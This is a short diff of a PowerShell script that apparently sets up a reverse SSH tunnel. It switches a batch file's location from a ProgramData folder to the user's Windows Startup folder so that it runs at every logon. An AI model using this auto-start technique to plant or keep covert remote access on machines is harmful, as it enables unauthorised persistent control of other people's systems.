@@ -40,8 +40,8 @@ $receivedPort = 2004
 $neutralPath = "C:\ProgramData\revssh"
 #$logFile = "$neutralPath\rev_ssh.log"
 $logFile = "$userProfile\rev_ssh.log"
-$batFilePath = "$neutralPath\rev_ssh.bat"
-#$batFilePath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rev_ssh.bat"
+#$batFilePath = "$neutralPath\rev_ssh.bat"
+$batFilePath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rev_ssh.bat"
 
 # Create C:\ProgramData\revssh if it doesn't exist
 if (-not (Test-Path $neutralPath)) {
